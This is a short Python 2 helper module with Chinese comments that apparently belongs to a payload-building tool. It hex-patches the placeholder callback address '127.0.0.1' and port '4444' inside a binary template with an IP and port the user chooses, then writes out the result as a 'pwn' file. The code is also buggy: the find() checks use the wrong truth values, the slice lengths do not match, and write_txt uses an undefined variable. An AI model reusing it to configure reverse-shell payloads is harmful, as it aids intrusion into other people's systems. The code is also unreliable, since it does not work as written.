#!/usr/bin/env python2
# -*- coding: utf-8 -*-
"""
说明:函数调用
"""

# python standard library

#获取需要改变的ip
def get_ex(file_data, ex_ip,ex_port):
    self_ip = "3132372e302e302e31"
    self_port = "34343434"
    ex_data = ""
    if file_data.find(self_ip):
        ex_ip_len = file_data.find(self_ip)
        ex_ip_data = file_data[ex_ip_len:ex_ip_len + len(ex_ip)]
        ex_data = file_data.replace(ex_ip_data,ex_ip)
    if ex_data.find(self_port):
        ex_port_len = ex_data.find(self_port)
        ex_port_data = ex_data[ex_port_len:ex_port_len + len(ex_port)]
        ex_data = ex_data.replace(ex_port_data,ex_port)
    return ex_data

#转十六进制
def cover_ip_port(ex_ip,ex_port):
    port_tmp = ""
    ip_tmp = ""
    for i in ex_port:
        tmp = i.encode('hex')
        port_tmp += tmp
    for j in ex_ip:
        tmp = j.encode('hex')
        ip_tmp += tmp
    return ip_tmp,port_tmp

#写出二进制文件
def write_pwn(file_data,path_name):
    print u"[+] 保存中..."
    try:
        ex_datas = file_data.decode("hex")
        ff = open(path_name,'wb')
        ff.write(ex_datas)
        ff.close()
        print u"[+] 文件保存路径在" + path_name
    except:
        print u"[-] 文件保存失败!请检查路径或参数"

#写出文本型文件
def write_txt(file_data,path_name):
    print u"[+] 保存中..."
    try:
        ff = open(path_name,'w')
        ff.write(ex_datas)
        ff.close()
        print u"[+] 文件保存路径在" + path_name
    except:
        print u"[-] 文件保存失败!请检查路径或参数"

